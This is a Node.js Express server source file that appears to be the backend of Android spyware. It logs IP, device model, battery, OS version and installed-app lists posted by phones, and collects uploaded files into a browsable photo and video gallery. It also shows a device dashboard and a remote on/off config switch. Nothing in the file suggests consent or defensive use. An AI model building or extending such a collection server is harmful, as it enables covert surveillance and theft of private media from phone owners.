const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

/* ================= CONFIG ================= */

const LOG_FILE = "logs.json";
const UPLOAD_DIR = path.join(__dirname, "uploads");

if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR);
}

/* ================= HELPERS ================= */

function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
      || req.socket.remoteAddress
      || "unknown";
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch {}
}

function parseBody(body) {
  const obj = {};
  body.split("&").forEach(pair => {
    const [key, value] = pair.split("=");
    if (key && value) {
      obj[key] = decodeURIComponent(value);
    }
  });

  if (obj.apps) {
    obj.apps = obj.apps.split(",").map(x => x.trim()).filter(Boolean);
  }

  return obj;
}

/* ================= CONFIG CONTROL ================= */

app.get('/config', (req, res) => {
  // 0 = OFF, 1 = ON
  res.send("0");
});

/* ================= TRACK ================= */

app.post('/track', (req, res) => {

  let body = "";

  req.on('data', chunk => body += chunk.toString());

  req.on('end', () => {

    const parsed = parseBody(body);

    const data = {
      ip: getIP(req),
      battery: parsed.battery,
      model: parsed.model,
      brand: parsed.brand,
      android: parsed.android,
      apps: parsed.apps || [],
      time: new Date().toISOString()
    };

    console.log("\n📱 DEVICE =====================");
    console.log(data);

    saveLog(data);

    res.json({ status: "ok" });
  });
});

/* ================= UPLOAD ================= */

app.post('/upload', (req, res) => {

  let fileName = Date.now().toString();

  let original = "file.bin";

  if (req.query.name) {
    try {
      const decoded = decodeURIComponent(req.query.name);
      original = path.basename(decoded);
    } catch {}
  }

  const ext = path.extname(original);
  fileName += ext || ".bin";

  const filePath = path.join(UPLOAD_DIR, fileName);

  console.log("\n📦 FILE RECEIVED =====================");
  console.log("Query:", req.query);
  console.log("Saved as:", fileName);

  const stream = fs.createWriteStream(filePath);
  req.pipe(stream);

  stream.on('error', () => {
    console.log("Write error");
  });

  req.on('end', () => {

    saveLog({
      type: "file",
      file: fileName,
      time: new Date().toISOString()
    });

    res.json({ status: "uploaded", file: fileName });
  });

  req.on('error', () => {
    res.status(500).send("error");
  });
});

/* ================= USERS ================= */

app.get('/users', (req, res) => {

  if (!fs.existsSync(LOG_FILE)) return res.send("No data");

  const logs = fs.readFileSync(LOG_FILE, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map(x => JSON.parse(x));

  const unique = {};

  logs.forEach(log => {
    if (!log.ip || !log.model) return;
    const key = log.ip + "_" + log.model;
    unique[key] = log;
  });

  const list = Object.values(unique);

  let html = `
  <html>
  <head>
    <style>
      body { background:#111; color:#fff; font-family:sans-serif; }
      .card { border:1px solid #333; padding:15px; margin:10px; border-radius:10px; }
      .apps { max-height:200px; overflow:auto; background:#000; padding:10px; }
      .apps div { font-size:12px; border-bottom:1px solid #222; padding:2px; }
    </style>
  </head>
  <body>
    <h2>Total Devices: ${list.length}</h2>
  `;

  list.reverse().forEach(user => {

    html += `
    <div class="card">
      <b>IP:</b> ${user.ip}<br>
      <b>Device:</b> ${user.brand} ${user.model}<br>
      <b>Android:</b> ${user.android}<br>
      <b>Battery:</b> ${user.battery}<br>

      <h4>Apps (${user.apps?.length || 0})</h4>
      <div class="apps">
        ${(user.apps || []).map(a => `<div>${a}</div>`).join("")}
      </div>
    </div>
    `;
  });

  html += "</body></html>";

  res.send(html);
});

/* ================= GALLERY ================= */

app.get('/gallery', (req, res) => {

  const files = fs.readdirSync(UPLOAD_DIR);

  let html = `
  <html>
  <head>
    <style>
      body { background:#111; color:#fff; font-family:sans-serif; }
      .grid { display:flex; flex-wrap:wrap; }
      .card { margin:10px; }
      img, video { width:220px; border-radius:10px; display:block; }
      a { color:#0af; text-decoration:none; }
      .btn { margin-top:5px; display:inline-block; }
    </style>
  </head>
  <body>
    <h2>Total Files: ${files.length}</h2>
    <div class="grid">
  `;

  files.reverse().forEach(file => {

    const url = `/uploads/${file}`;

    if (file.endsWith(".jpg") || file.endsWith(".png")) {
      html += `
        <div class="card">
          <img src="${url}" />
          <a class="btn" href="${url}" download>⬇ Download</a>
        </div>
      `;
    }

    else if (file.endsWith(".mp4")) {
      html += `
        <div class="card">
          <video controls>
            <source src="${url}" type="video/mp4">
          </video>
          <a class="btn" href="${url}" download>⬇ Download</a>
        </div>
      `;
    }

    else {
      html += `
        <div class="card">
          <a href="${url}" target="_blank">${file}</a>
        </div>
      `;
    }

  });

  html += `</div></body></html>`;

  res.send(html);
});

/* ================= STATIC ================= */

app.use('/uploads', express.static(UPLOAD_DIR));

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
